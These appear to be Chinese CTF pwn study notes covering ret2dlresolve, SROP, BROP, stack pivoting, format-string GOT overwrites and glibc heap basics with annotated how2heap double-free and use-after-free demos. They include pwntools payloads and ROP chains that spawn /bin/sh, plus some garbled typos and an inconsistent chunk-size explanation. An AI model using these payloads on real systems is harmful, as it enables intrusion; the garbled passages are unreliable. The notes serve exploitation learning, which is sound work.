0x00000011 -> DT_REL      -> .rel.dyn 地址，32 位常见
0x00000012 -> DT_RELSZ    -> .rel.dyn 总大小
0x00000013 -> DT_RELENT   -> .rel.dyn 中每个重定位项大小
0x00000014 -> DT_PLTREL   -> PLT 使用 REL 还是 RELA
0x00000015 -> DT_DEBUG    -> 调试器相关结构地址
0x00000018 -> DT_BIND_NOW -> 程序启动时立即解析所有 PLT
0x0000001e -> DT_FLAGS    -> 动态链接标志
0x6ffffff0 -> DT_VERSYM   -> .gnu.version 地址
0x6ffffffe -> DT_VERNEED  -> .gnu.version_r 地址
0x6fffffff -> DT_VERNEEDNUM -> 需要的版本依赖数量
0x00000000 -> DT_NULL     -> .dynamic 结束标记
```
[[yuque-export/1/ctfshow/pwn/pwn|pwn]] 82

32位可以用pwntools自动生成

```python
dlresolve = Ret2dlresolvePayload(
    elf,
    symbol="system",
    args=["/bin/sh"]
)

rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

payload = flat({
    offset: rop.chain(),
    256: dlresolve.payload
})
```

运行时程序可能会先等第一次输入主payload，然后执行`read`等待第二次输入伪造结构。没继续发的话就会像卡住一样。

### SROP

SROP就是伪造信号帧。

如果程序里有`syscall`，又能触发`sigreturn`，就可以用`SigreturnFrame`一次性控制很多寄存器。

找`syscall`

```bash
ROPgadget --binary ./pwn --only "syscall"
```

64位执行`execve("/bin/sh", 0, 0)`：

```python
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr

payload = bytes(frame)
```

如果`context.arch`没设置对，`SigreturnFrame`结构会错，程序一般直接崩。

### BROP

BROP是没有本地文件，只能靠远程崩溃和不崩溃来猜ROP。

流程一般是

1. 爆破padding。
2. 找`stop gadget`，也就是执行后不会崩、能重新输出欢迎语的地址。
3. 找`__libc_csu_init`附近的BROP gadget。
4. 推出`pop rdi; ret`。
5. 找`puts@plt`。
6. dump程序，找`puts@got`。
7. ret2libc。

判断输出很关键。

找到stop以后，程序一般会重新输出欢迎语，例如

```text
Do you know who is daniu?
```

找到`puts@plt`以后，用`puts(0x400000)`测试，如果输出

```text
\x7fELF
```

说明基本找对了。

## 栈迁移

栈迁移也叫stack pivot。

使用场景：

* 当前溢出空间太小，放不下完整ROP链
* 能控制保存的`ebp/rbp`
* 有一块更大的可控区域，比如`.bss`、全局数组、堆、第二次输入

关键指令是

```asm
leave
ret
```

等价于

```asm
mov rsp, rbp
pop rbp
ret
```

32位就是

```asm
mov esp, ebp
pop ebp
ret
```

所以只要覆盖保存的`rbp`为假栈地址，再让程序执行`leave; ret`，`rsp`就会被迁移到假栈。

假设有一个漏洞函数

```c
char buf[0x20];
read(0, buf, 0x30);
```

最多只能覆盖到保存的`rbp`和返回地址，放不下完整ROP。

栈布局大概是

```text
buf
saved rbp
return address
```

payload可以写成

```python
payload = b"A" * 0x20
payload += p64(fake_stack)
payload += p64(leave_ret)
```

执行过程是

1. 函数返回前执行自己的`leave; ret`
2. `rbp`被恢复成我们写进去的`fake_stack`
3. `ret`跳到`leave_ret`
4. 再执行一次`leave; ret`
5. `rsp = fake_stack`
6. 从`fake_stack`开始取新的`rbp`和新的返回地址

假栈要这样摆

```text
fake_stack:
    next_rbp
    next_rip
    ROP参数1
    ROP参数2
```

如果要迁移到`.bss`，先找`.bss`

```bash
readelf -S ./pwn | grep .bss
vmmap
```

再找`leave; ret`

```bash
ROPgadget --binary ./pwn --only "leave|ret"
```

常见两段式：

第一段输入，把第二阶段ROP写到`.bss`

```python
bss = 0x602800

payload1 = b"A" * offset
payload1 += p64(pop_rdi) + p64(0)
payload1 += p64(pop_rsi_r15) + p64(bss) + p64(0)
payload1 += p64(read_plt)
payload1 += p64(pop_rbp) + p64(bss)
payload1 += p64(leave_ret)
```

程序执行到`read(0, bss, ...)`时会停下来等第二次输入。

第二段输入放真正ROP链

```python
payload2 = flat(
    0xdeadbeef,     # next rbp
    pop_rdi,
    binsh,
    system
)
```

这里为什么第一个是`0xdeadbeef`？

因为`leave`会先`pop rbp`，所以假栈第一个8字节会被当成新的`rbp`吃掉，第二个8字节才会被`ret`当成`rip`。

32位栈迁移同理，只是换成`p32`，参数放栈上

```python
payload = b"A" * offset
payload += p32(fake_stack)
payload += p32(leave_ret)

fake_stack_payload = flat(
    next_ebp,
    system_plt,
    0xdeadbeef,
    binsh
)
```

调试时重点看

```gdb
b *leave_ret
r
info registers
x/20gx $rsp
x/20gx fake_stack
```

成功迁移后，`rsp`应该等于你布置的`fake_stack`附近。

如果失败，常见原因：

* `fake_stack`地址写错
* 假栈第一个位置忘了放`next_rbp`
* `leave_ret`地址写错
* 第二阶段ROP还没写进`.bss`
* 64位栈没有16字节对齐，调用`system`时崩了

栈迁移成功以后，程序输出一般没有特殊提示。它会直接继续执行假栈上的ROP；如果最后是`system("/bin/sh")`，就直接进shell。

# 格式化字符串
## `printf()`的函数原型为：

```c
int printf(const char *format, ...);
```

第一个参数`format`是格式化字符串，后续可变参数根据`format`中的占位符进行解析。当`format`完全由用户控制时，攻击者可以插入任意数量和类型的占位符，从而操纵`printf()`对后续参数的读取方式。

#### 关键占位符：

```
%x、%p：读取并输出栈上的数据（内存泄露）

%s：将对应参数视为指针，读取该地址处的字符串（可能触发段错误或泄露敏感信息）

%n：将当前已成功输出的字符数写入对应参数指向的地址（任意地址写入）

%c：输出单个字符，可用于控制输出字符数

%d：输出十进制整数
```

**直接参数访问**：通过`%k$n`（如`%7$n`）可直接指定使用第k个参数，无需按顺序遍历所有占位符。

%h 本身不是一个完整占位符，它是**长度修饰符**，要和后面的转换符一起用。

常见的是：

`%hn %hhn %hd %hu %hx
`
在格式化字符串利用里最常见的是这两个：
%n   写 4 字节，int
%hn  写 2 字节，short
%hhn 写 1 字节，char

#### printf里面的参数位置计算
进入pinrtf后，栈大概是：
```
esp -> 返回地址
esp+4  -> fmt（也就是 buf 的地址）
esp+8  -> printf 认为的第1个变参
esp+12 -> printf 认为的第2个变参
esp+16 -> printf 认为的第3个变参
...
```
![[Pasted image 20260421191549.png]]
举个例子，这个是91的题目
这里面能看见fmt是0xd0c0,因为这个就是我们输入的位置
他里面写的指向的是0xd0dc,这个位置是我们输入的字符
所以在使用call的时候，会把参数压进栈空间里面的地址
- %1$p -> 0xffffd0dc
- %2$p -> 0x50
- %3$p -> 0x804870a
- %4$p -> 0xf7f93788
- %5$p -> 0x46
- %6$p -> 0xf7f94d40
所以第七个参数就是你输入的东西，可以当成参数传入的东西
### 格式化字符串函数使用

```
fmtstr_payload(6, {printf_got: system_plt}, write_size="short")
```
#### 1. 第一个参数 6

`6`

是格式化字符串偏移。

比如你的 payload 里放了地址：

`p32(printf_got)`

当程序执行：

`printf(buf);`

这个地址会被 printf 当成第几个参数读取。

如果它是第 6 个参数，就写：

`fmtstr_payload(6, ...)`

偏移一般这样扫：

`io.send(b"AAAA.%p.%p.%p.%p.%p.%p.%p.%p")`

如果输出里第 6 个位置出现：

`0x41414141`

说明偏移是 6。

#### 2. 第二个参数 {printf_got: system_plt}

这是一个字典：

`{ 要写的地址: 要写进去的值 }`

在 94 题里：

`printf_got = 0x0804a010 system_plt = 0x08048400`

所以：

`{printf_got: system_plt}`

意思是：

`把 0x0804a010 这个地址里的值改成 0x08048400`

也就是：

`printf@got -> system@plt`

#### 3. write_size="short"

控制每次写几个字节。

常见选项：

`write_size="byte" # 用 %hhn，一次写 1 字节 write_size="short" # 用 %hn，一次写 2 字节 write_size="int" # 用 %n，一次写 4 字节`

short 对应：

`%hn`

也就是每次写 2 字节。

32 位地址是 4 字节，所以通常会拆成两次写：

`低 2 字节 高 2 字节`
## 栈布局与参数定位

在32位系统中，函数调用时参数通过栈传递。`printf()`被调用时，其栈帧结构如下（从低地址到高地址）：

|栈地址|内容|
|---|---|
|…|调用者栈帧|
|返回地址|`printf`返回后继续执行的地址|
|旧ebp|调用者的基址指针|
|**格式化字符串指针**|**第一个参数：`format`的地址**|
|参数1|对应`format`中第一个占位符的参数|
|参数2|对应第二个占位符的参数|
|…|…|

然而，`printf()`内部解析参数时，会从`format`参数之后的位置开始访问参数。
# 堆前置知识

## 堆

网址：<https://www.bilibili.com/video/BV1Bt421t7UV/?spm_id_from=333.337.search-card.all.click&vd_source=32a771c76f944d3de95caeaf9eeade33>

*堆漏洞是无法对程序控制流劫持*

*想要劫持孔梓睿，一种是利用程序本身对于堆的利用，想办法修改堆上的函数指针，子在程序调用对上的数据达成目的*

*另一种是基于对于堆分配的理解，打到任意地址分配而实现任意地址写*

*有两个工具，一个是patchelf，另一个是glibc-all-in-one*

堆是动态内存，在册灰姑娘徐执行期间可以随时分配和释放，适合存储大型数据结构

### top chunk

第一次申请内存的时候，会分成两块，一块给用户，另一块成为topchunk

再次申请块的时候如果没有合适的空间的话就会使用top chunk的空间

### 起始地址

申请到的内存的起始地址不等于可以写入数据的起始地址，因为堆头会记录一些消息，所以可以看到有一定的大小差距

### 申请大小

申请大小不等于实际申请大小，会有一个取整的过程

### chunk

再从得到的内存上分配所申请的相应的小段内存，称为chunk，并返回地址给程序

### 堆块释放

如果申请了很多的堆块，不考虑释放堆块，那么他们会按照申请的顺序依次从低地址到高地址排列

### 函数

#### malloc

```plain
void *malloc(size_t size);
```

申请一块 `size` 字节的堆内存，返回指针。\
申请成功返回可用地址，失败返回 `NULL`。

#### free

```plain
void free(void *ptr);
```

释放调用其他函数所分配的内存空间

ptr是指向要释放内存的内存块的指针，如果传递的是空指针则不会进行任何动作

\*\*注意free不会清除内存块的数据 \*\*

一般free所释放的堆块不会被立刻回收，他们会变成一种叫Free Chunk的东西并且加上一种类似xxx bin的名字，一般这类堆块释放后如果挨着一个也被释放的堆块或者是Top Chunk会合并，当然Fast Bin是一个特例，他不会轻易合并

#### calloc

```plain
void *calloc(size_t nmemb, size_t size);
```

申请 `nmemb * size` 字节的堆内存，并**全部清零**。

#### realloc

```plain
void *realloc(void *ptr, size_t size);
```

把 `ptr` 指向的堆内存调整为 `size` 大小。\
它可能：

* 原地扩容 / 缩容
* 分配一块新内存，把旧数据拷贝过去，再释放旧块

返回新指针。

注意如果是分配新内存，旧内存的数据并不会清空

# 第三部分

## <font style="color:rgb(68, 68, 68);">How2Heap堆利用学习笔记（一）</font>

<https://www.anquanke.com/post/id/192823>

### <font style="color:rgba(0, 0, 0, 0.85);">1.first\_fit</font>

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main()
{
    fprintf(stderr, "This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n");

    char *a = malloc(0x512);
    char *b = malloc(0x256);
    char *c;

    fprintf(stderr, "1st malloc(0x512): %p\n", a);
    fprintf(stderr, "2nd malloc(0x256): %p\n", b);
    fprintf(stderr, "we could continue mallocing here...\n");
    fprintf(stderr, "now let's put a string at a that we can read later \"this is A!\"\n");

    strcpy(a, "this is A!");
    fprintf(stderr, "first allocation %p points to %s\n", a, a);

    fprintf(stderr, "Freeing the first one...\n");
    free(a);

    fprintf(stderr, "So, let's allocate 0x500 bytes\n");
    c = malloc(0x500);

    fprintf(stderr, "3rd malloc(0x500): %p\n", c);
    fprintf(stderr, "And put a different string here, \"this is C!\"\n");

    strcpy(c, "this is C!");
    fprintf(stderr, "3rd allocation %p points to %s\n", c, c);
    fprintf(stderr, "first allocation %p points to %s\n", a, a);

    fprintf(stderr, "If we reuse the first allocation, it now holds the data from the third allocation.\n");

    free(b);
    free(c);
    return 0;
}
```

可以观察到其中第一第二个堆

计算一下，第一第二个堆之间应该空0x512个字节作为栈空间

![1773968681572-8193eb23-0d61-43f1-8e32-ed38c9a2d8f4.png](1773968681572-8193eb23-0d61-43f1-8e32-ed38c9a2d8f4-394266.png)

发现问题所在，实际上两个堆之间的空间是0x520，为什么不是512

因为 `malloc(0x512)` 申请到的**不是只有 0x512 字节用户区**，glibc 还会给这块 chunk 加上**头部元数据**，并且做**对齐**，所以实际占用的 chunk 大小会变成 **0x520**。

实际头部是

* `prev_size`：8 字节
* `size`：8 字节

所以实际上的请求大小是0x522字节

但是因为chunk大小需要对齐，所以实际分配是0x530

`实际 chunk size ≈ 对 (请求大小 + 0x8 或按规则修正后的值) 做 0x10 对齐 `

这个实际用到了直接去gdb里面看就行了

![1773969817595-38bb8600-102c-4486-977c-8bdd333f92ed.png](1773969817595-38bb8600-102c-4486-977c-8bdd333f92ed-781308.png)

这个是free之前的值

至于怎么插进去，在反编译里面有写

```c
mov     rax, [rbp+ptr]				将a的地址放到rax
mov     rbx, 2073692073696874h		将数据放到rbx
mov     [rax], rbx					将rbx里面的值放到rax
mov     word ptr [rax+8], 2141h		将rax后面再加上A!
mov     byte ptr [rax+0Ah], 0		在最后加上\0
```

然后进行free

![1773970519313-858f13bf-2be6-418a-a75d-fa4c372ea168.png](1773970519313-858f13bf-2be6-418a-a75d-fa4c372ea168-972048.png)

这里面保存的地址是链接到<font style="color:rgb(51, 51, 51);">unsorted bin中</font>

![1773970599237-12b4e28f-6b2a-44a5-a64b-b67adfbf8d37.png](1773970599237-12b4e28f-6b2a-44a5-a64b-b67adfbf8d37-636599.png)

这个就是unsort bin里面的地址

然后看回到a里面的两个地址是什么，是fd和bk

![1774001784927-0e9eaef2-9684-4d91-96e1-5a50fdd47c20.png](1774001784927-0e9eaef2-9684-4d91-96e1-5a50fdd47c20-067254.png)

注意看这张图中，展示的形式基本是一样的，fd是指向前面一个堆的指针，bk是指向后面一个堆的指针

![1774346495706-09115573-0fab-4777-89b7-f35fe2504b75.png](1774346495706-09115573-0fab-4777-89b7-f35fe2504b75-925119.png)

这张图片是执行了`c = malloc(0x500);`命令后的堆

一行行解释

290：因为这一部分的堆并不需要使用，所以是0

298：堆的长度，是521

2a0：指向unsorted bin的一个指针

2a8：指向unsorted bin的一个指针

因为这一块比较大，所以并不会进入fast bin

他是当前unsort bin里面的唯一元素，所以链表只有一个值

所以指向的前后都是同样的

2b8和2c8对应的是**large bin 管理字段**

* `fd_nextsize`
* `bk_nextsize`

之后到了this is c的字段

![1774347614480-f946cb6d-78a2-4388-bb4f-51e2c13ba143.png](1774347614480-f946cb6d-78a2-4388-bb4f-51e2c13ba143-872443.png)

可以看见插入这些字段以后这里面就有了this is c!的数据

这道题目里面存在着UAF漏洞

UAF，全称 **Use After Free**，中文一般叫：

* **释放后使用**
* **释放后重用漏洞**

意思很直接：

一块堆内存已经 `free()` 了，但程序里还保留着指向它的旧指针，并且后面又继续通过这个旧指针去读、写、调用。

这时候，这个旧指针就叫：

* **悬空指针**
* **dangling pointer**

因为它“看起来还指向原来的地方”，但那块内存已经**不归你了**。

所以很明确，在A释放后还还有指针指向着A

`fprintf(stderr, "first allocation %p points to %s\n", a, a);`这一行代码还能读出来值，说明这个指向a的指针还保留着

只要利用了这个指针，就可能触发UAF漏洞

至于为什么里面的两个nextsize还存在则是因为malloc这个函数并不会清理用户区

### <font style="color:rgba(0, 0, 0, 0.85);">2.fastbin\_dup\_into\_stack</font>

```c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    fprintf(stderr,
            "This file extends on fastbin_dup.c by tricking malloc into\n"
            "returning a pointer to a controlled location (in this case, the stack).\n");

    unsigned long long stack_var;

    fprintf(stderr, "The address we want malloc() to return is %p.\n",
            (void *)(8 + (char *)&stack_var));
    fprintf(stderr, "Allocating 3 buffers.\n");

    int *a = malloc(8);
    int *b = malloc(8);
    int *c = malloc(8);

    fprintf(stderr, "1st malloc(8): %p\n", (void *)a);
    fprintf(stderr, "2nd malloc(8): %p\n", (void *)b);
    fprintf(stderr, "3rd malloc(8): %p\n", (void *)c);
    fprintf(stderr, "Freeing the first one...\n");

    free(a);
    fprintf(stderr,
            "If we free %p again, things will crash because %p is at the top of the free list.\n",
            (void *)a, (void *)a);

    // free(a);

    fprintf(stderr, "So, instead, we'll free %p.\n", (void *)b);
    free(b);

    fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n",
            (void *)a);
    free(a);

    fprintf(stderr,
            "Now the free list has [ %p, %p, %p ]. We'll now carry out our attack by modifying data at %p.\n",
            (void *)a, (void *)b, (void *)a, (void *)a);

    unsigned long long *d = malloc(8);

    fprintf(stderr, "1st malloc(8): %p\n", (void *)d);
    fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
    fprintf(stderr, "Now the free list has [ %p ].\n", (void *)a);

    fprintf(stderr,
            "Now, we have access to %p while it remains at the head of the free list.\n"
            "So now we are writing a fake free size (in this case, 0x20) to the stack,\n"
            "so that malloc will think there is a free chunk there and agree to\n"
            "return a pointer to it.\n",
            (void *)a);

    stack_var = 0x20;

    fprintf(stderr,
            "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n",
            (void *)a);

    *d = (unsigned long long)(((char *)&stack_var) - sizeof(d));

    fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
    fprintf(stderr, "4th malloc(8): %p\n", malloc(8));

    return 0;
}
```

首先他先申请了三块堆空间，a，b，c

![1774348994183-d09c19fe-e78b-46c1-940f-3dbefc347ecf.png](1774348994183-d09c19fe-e78b-46c1-940f-3dbefc347ecf-797519.png)

三块堆的地址

然后释放a

![1774349506495-1a096af6-24e7-4f2c-92f1-23b1b1846424.png](1774349506495-1a096af6-24e7-4f2c-92f1-23b1b1846424-515691.png)

查看fastbin里面的堆

![1774350284848-eca2e356-f1da-4b47-b60d-3dc6dcb601b4.png](1774350284848-eca2e356-f1da-4b47-b60d-3dc6dcb601b4-093114.png)

这个时候不能再次释放a，因为fastbin的队首就是a，所以直接释放会导致检测到队首而失败

然后释放b

![1774350579048-83655f68-8fa9-406d-bf86-8149d3c5eebc.png](1774350579048-83655f68-8fa9-406d-bf86-8149d3c5eebc-376658.png)

发现这个里面多出来一个地址

这个地址是b的fd指针，指向前面一个已经释放的堆

注意一下a的堆地址是2d0，b的堆地址是2f0，但是b的fd指针指向的是a的prev\_size参数，所以会指向指向a的指针的前面

下一步是重新释放a堆

![1774350769764-9638e5ea-a8b7-4b4b-bc49-027c628b7876.png](1774350769764-9638e5ea-a8b7-4b4b-bc49-027c628b7876-371821.png)

发现a的里面也有了一个fd指针，指向的是b

这里因为fastbin的队首不再是a了，所以可以再次释放

然后下一步看一下内存

![1774447131195-7329b4f5-598a-46b1-b89b-7b3d66bfa21b.png](1774447131195-7329b4f5-598a-46b1-b89b-7b3d66bfa21b-520180.png)

发现fastbin的队首变了

fastdbin的机制是把相邻的，已经被释放的chunk串成队列然后把队首放在fastbin的链表里面

至于链表里面的队列直接由chunk里面的fd存储

free：

直接把链表插入头，然后把fd字段改成刚才的链表头

所以其实他就是在维护一个由小型堆组成的单向链表

malloc：

取链表头，然后把链表头改成下一个，把原节点的chunk返回给用户

这个时候观察一下两个队列的指针指向的是互相

![1774447404587-d40b61ae-f666-404b-a3ff-b9f4438e0507.png](1774447404587-d40b61ae-f666-404b-a3ff-b9f4438e0507-039346.png)

这里指针直接循环了

之后无论malloc多少次，都是在重复申请这两段小堆

<code>*d = (unsigned long long)(((char *)&stack_var) - sizeof(d));</code>

注意看这句话， 把 `0x5555555592d0` 这块数据的前 8 字节，改成了<code>&stack_var - 8</code>

也就是`0x7fffffffe178`

所以`fastbin[0]`的链表头，已经不再指向真实堆块，而是被你改成了栈上的一个伪造 `chunk`。

`unsigned long long stack_var;`这个变量是 `main` 的局部变量

因为我们的目标是访问stack\_var+8这个地址，然后又因为size和prev\_size加起来用共有0x10个地址

所以我们需要直接定义df的地址为stack\_var-8的地址，然后他就会自己默认chunk的数据存储是从stack\_var+8的地址开始

fastbin会检测chunk的size是不是符合来让自己显得不是太蠢

所以把stack\_var的位置的值赋值为0x20显得是一个fastbin里面应该存储的chunk

之后直接在这个chunk里面写值，就会出现直接覆盖到main的返回地址，然后执行栈溢出漏洞

# 第四部分

## 看雪《PWN入门-22-FastBin与DoubleFree降妖》：补 FastBin、Double Free 的中文直觉。

<https://bbs.kanxue.com/thread-286597.htm>

